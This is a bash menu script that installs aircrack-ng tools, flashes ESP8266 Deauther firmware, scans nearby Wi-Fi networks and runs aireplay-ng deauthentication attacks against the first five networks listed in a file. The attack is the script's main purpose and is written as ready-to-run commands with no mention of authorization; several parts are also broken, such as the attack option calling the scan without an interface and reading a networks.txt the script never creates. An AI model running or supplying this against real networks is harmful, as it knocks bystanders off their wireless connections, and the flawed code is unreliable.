#!/bin/bash

# Function to install dependencies on Debian
install_deps_debian() {
  echo "Installing dependencies for Debian-based systems..."
  apt-get update
  apt-get install -y python3-pip python3-setuptools git esptool aircrack-ng wireless-tools
  pip3 install esptool
}

# Function to install dependencies on Arch Linux
install_deps_arch() {
  echo "Installing dependencies for Arch-based systems..."
  pacman -Syu --noconfirm
  pacman -S --noconfirm python-pip git esptool aircrack-ng wireless_tools
 # pip install esptool
}

# Function to flash the ESP8266 Deauther firmware
flash_esp() {
  echo "Flashing ESP8266 Deauther firmware..."
  read -p "Enter the path to the firmware.bin file: " firmware_path
  if [ -f "$firmware_path" ]; then
    esptool.py --port /dev/ttyUSB0 write_flash 0x00000 "$firmware_path"
    echo "Flashing completed. You may need to configure the ESP8266 via its web interface."
  else
    echo "Firmware file not found. Please check the path and try again."
  fi
}

# Function to run the Wi-Fi scan using airodump-ng
scan_wifi() {
  local interface_name=$1
  local scan_file="scan_output.csv"
  
  # Enable monitor mode
  echo "Setting up monitor mode on $interface_name..."
  airmon-ng start $interface_name
  
  # Find the monitor mode interface name
  local monitor_interface=$(airmon-ng | grep "mon" | awk '{print $2}')
  if [ -z "$monitor_interface" ]; then
    echo "Failed to enable monitor mode."
    exit 1
  fi
  
  echo "Scanning for Wi-Fi networks on $monitor_interface..."
  airodump-ng --output-format csv --write $scan_file $monitor_interface --band bg --channel 1
  echo "Scan complete. Results saved to $scan_file"
}

# Function to compare scans using diff
compare_scans() {
  local prev_scan="prev_scan.csv"
  local curr_scan="scan_output.csv"
  
  if [ -f "$prev_scan" ]; then
    echo "Comparing previous scan with current scan..."
    diff $prev_scan $curr_scan > scan_diff.txt
    echo "Comparison complete. Differences saved to scan_diff.txt"
  else
    echo "No previous scan to compare."
  fi

  # Update the previous scan file
  cp $curr_scan $prev_scan
}

# Function to run the deauth attack
deauth_attack() {
  echo "Starting deauth attack on top 5 Wi-Fi networks..."
  networks=$(head -n 5 networks.txt)
  for network in $networks; do
    echo "Sending deauth packets to network: $network"
    aireplay-ng --deauth 10 -a $network wlan0
  done
  echo "Deauth attack started."
}

# Function to set up monitor mode
setup_monitor_mode() {
  echo "Setting up monitor mode..."
  airmon-ng start wlan0
  echo "Monitor mode enabled."
}

# Function to run the script
run_script() {
  echo "Choose an option:"
  echo "1. Install Dependencies"
  echo "2. Flash ESP8266 Deauther(use the default)"
  echo "3. Scan for Wi-Fi Networks"
  echo "4. Compare Scans"
  echo "5. Start Deauth Attack"
  echo "6. Set Up Monitor Mode"
  read -p "Enter option (1-6): " option

  case $option in
    1)
      if [ -x "$(command -v apt-get)" ]; then
        install_deps_debian
      elif [ -x "$(command -v pacman)" ]; then
        install_deps_arch
      else
        echo "Unsupported OS"
        exit 1
      fi
      ;;
    2)
      flash_esp
      ;;
    3)
      read -p "Enter the wireless interface name: " interface_name
      scan_wifi $interface_name
      ;;
    4)
      compare_scans
      ;;
    5)
      scan_wifi
      setup_monitor_mode
      deauth_attack
      ;;
    6)
      read -p "Enter the wireless interface name: " interface_name
      setup_monitor_mode $interface_name
      ;;
    *)
      echo "Invalid option"
      ;;
  esac
}

# Run the script
run_script

echo "Operation complete."

